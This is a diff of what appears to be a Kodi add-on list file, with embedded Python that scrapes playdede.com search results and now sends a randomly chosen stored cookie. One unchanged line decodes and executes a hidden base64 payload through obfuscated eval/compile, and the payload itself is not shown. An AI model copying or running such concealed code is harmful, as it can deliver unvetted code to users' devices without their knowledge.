@@ -10,6 +10,10 @@
 
 
 
+
+
+
+
 <item>
 <title>[COLOR gold]*[/COLOR] [COLOR lightsalmon]Buscador [COLOR white]Pidepalomitas playdede[/COLOR]</title>
 <link>$doregex[makelist2]</link>
@@ -51,7 +55,8 @@ def GetLSProData(page_data, Cookie_Jar, m):
     cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
     Palabra_Buscada = xbmcgui.Dialog().input('Buscar Peliculas: ', type=xbmcgui.INPUT_ALPHANUM)
     Palabra_Buscada = urllib_parse.quote_plus(six.ensure_str(Palabra_Buscada))
-    response = requests.get('https://playdede.com/search/?s='+Palabra_Buscada, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0','Host': 'playdede.com','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3','Upgrade-Insecure-Requests': '1'}).text
+    response = requests.get('https://playdede.com/search/?s='+Palabra_Buscada, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0','Host': 'playdede.com','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3','Upgrade-Insecure-Requests': '1'
+,'Connection': 'keep-alive','Cookie': cookie}).text
     response = six.ensure_str(response)
     ArchivoDestino = EJECUTAR_XBMC.translatePath('special://home/addons/plugin.video.cristalazul/')
     open(ArchivoDestino + 'html.txt','wb').write(six.ensure_binary(cookie+'*'+'*'+response))
@@ -98,7 +103,8 @@ def GetLSProData(page_data,Cookie_Jar,m,url=url):
     cookie_distancia = six.ensure_str(cookie_distancia)
     patron = '(?s)href="(.*?)".*?src.*?>(.*?)<.*?>(.*?)<.*?languages/(.*?)[_\.]'
     cookie = cookie_distancia.split('*')[random.randrange(len(cookie_distancia.split('*'))-1)]
-    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0','Host': 'playdede.com','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3','Upgrade-Insecure-Requests': '1'}).text
+    response = requests.get(url+'/', headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0','Host': 'playdede.com','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3','Upgrade-Insecure-Requests': '1'
+,'Connection': 'keep-alive','Cookie': cookie}).text
     response = six.ensure_str(response)
     data = re.findall(patron, response.split("linksUsers")[1].split("linksUsers")[0])
     try:
@@ -220,7 +226,6 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 <thumbnail>https://i.imgur.com/r6aXooD.jpg</thumbnail>
 <fanart>https://i.imgur.com/gPpqFAT.jpg</fanart>
 </item>
-
 
 
 
